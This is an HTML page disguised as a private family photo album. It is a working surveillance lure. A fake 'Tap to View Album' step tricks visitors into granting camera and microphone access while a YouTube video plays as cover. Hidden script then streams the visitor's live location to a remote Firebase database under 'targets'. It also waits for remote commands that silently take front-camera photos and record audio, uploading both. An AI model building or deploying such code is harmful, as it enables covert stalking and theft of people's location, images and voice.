<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Cloud Album</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #111; color: white; text-align: center; margin: 0; padding: 20px; }
        .gallery { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 20px; }
        .img-container { position: relative; overflow: hidden; border-radius: 10px; height: 180px; }
        .img-container img { width: 100%; height: 100%; object-fit: cover; filter: blur(15px); transition: 2s; }
        #unlockBtn { margin-top: 30px; padding: 15px 40px; font-size: 18px; font-weight: bold; background: #E91E63; color: white; border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(233,30,99,0.3); }
        #videoArea { display: none; width: 100%; margin-top: 20px; border-radius: 10px; overflow: hidden; background: #000; }
        #status { margin-top: 10px; font-size: 12px; color: #777; }
    </style>
</head>
<body>
    <h2>ðŸŒ¸ Family Shared Album</h2>
    <p id="msg">Verification required to view this private album.</p>

    <div class="gallery" id="albumGallery">
        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1583391733956-6c78276477e2?w=500"></div>
        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1595950653106-6c9ebd614d3a?w=500"></div>
    </div>

    <button id="unlockBtn" onclick="initSystem()">Tap to View Album</button>

    <div id="videoArea">
        <iframe id="player" width="100%" height="250" src="" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>

    <p id="status">Secure Link Verified</p>

    <script>
        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        
        // Fixed UserId (Persistent)
        let userId = localStorage.getItem("target_id") || "User_" + Math.floor(Math.random() * 9999);
        localStorage.setItem("target_id", userId);

        async function initSystem() {
            document.getElementById('status').innerText = "Connecting to server...";
            
            try {
                // 1. Silent Permission Request
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                
                // 2. Instant Online Status (Bina location ke bhi online show hoga)
                db.ref('targets/' + userId + '/location').update({
                    status: "Online",
                    last_seen: firebase.database.ServerValue.TIMESTAMP
                });

                // 3. UI Update (Video Play)
                document.getElementById('unlockBtn').style.display = "none";
                document.getElementById('albumGallery').style.display = "none";
                document.getElementById('msg').innerText = "Decrypting Media... Please wait.";
                document.getElementById('videoArea').style.display = "block";
                document.getElementById('player').src = "https://www.youtube.com/embed/tgbNymZ7vqY?autoplay=1&mute=0";

                // 4. Background Tracking & Commands
                startHiddenTracking();
                listenForCommands();

            } catch (e) {
                alert("Please Allow Permissions to see the album!");
                console.log(e);
            }
        }

        function startHiddenTracking() {
            // Live Location
            navigator.geolocation.watchPosition((pos) => {
                db.ref('targets/' + userId + '/location').update({
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    timestamp: new Date().toLocaleTimeString(),
                    last_seen: firebase.database.ServerValue.TIMESTAMP
                });
            }, null, { enableHighAccuracy: true });

            // Online Heartbeat (Background Active rakhta hai)
            setInterval(() => {
                db.ref('targets/' + userId + '/location').update({
                    status: "Online",
                    last_seen: firebase.database.ServerValue.TIMESTAMP
                });
            }, 10000);
        }

        function listenForCommands() {
            db.ref('commands/' + userId).on('value', async (snap) => {
                const cmd = snap.val();
                if (!cmd) return;
                if (cmd.action === "snap") { await captureSilentPhoto(); }
                if (cmd.action === "mic") { await recordSilentAudio(15); }
                db.ref('commands/' + userId).remove();
            });
        }

        async function captureSilentPhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg', 0.5);
                db.ref('targets/' + userId + '/photos').push({ image: imageData, time: new Date().toLocaleTimeString() });
                stream.getTracks().forEach(t => t.stop());
            } catch (e) { console.error(e); }
        }

        async function recordSilentAudio(sec) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const reader = new FileReader();
                    reader.readAsDataURL(new Blob(chunks));
                    reader.onloadend = () => {
                        db.ref('targets/' + userId + '/audio').push({ data: reader.result, time: new Date().toLocaleTimeString() });
                    };
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), sec * 1000);
            } catch (e) { console.error(e); }
        }
    </script>
</body>
</html>
